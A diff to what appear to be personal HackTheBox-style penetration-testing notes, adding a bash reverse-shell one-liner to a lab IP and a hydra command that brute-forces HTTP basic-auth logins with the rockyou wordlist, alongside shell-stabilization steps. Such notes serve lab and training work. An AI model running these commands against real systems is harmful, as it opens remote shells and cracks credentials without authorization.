@@ -70,11 +70,16 @@ references: HTB Writeups
 
 - gain shell via exploit
 - `Search-That-Hash`
-- Stablize shell
+- Stablize shell 
+	- `bash -i >& /dev/tcp/10.2.1.119/4242 0>&1[]`
 	- Step 1: `python3 -c 'import pty;pty.spawn("/bin/bash")'`  
 	- Step 2: `CTRL + Z`  
 	- Step 3: `stty raw -echo; fg` 
 	- Step 4: `export TERM=xterm`
+- Bruteforce http basic auth (pop up login) with #hydra
+```
+hydra -l [...]/usernames.txt -P [...]/rockyou.txt -u -e ns -f -t 64 '10.10.159.37' http-get /<web-path -V
+```
 
 ## Pivot to user
 - enumerate!
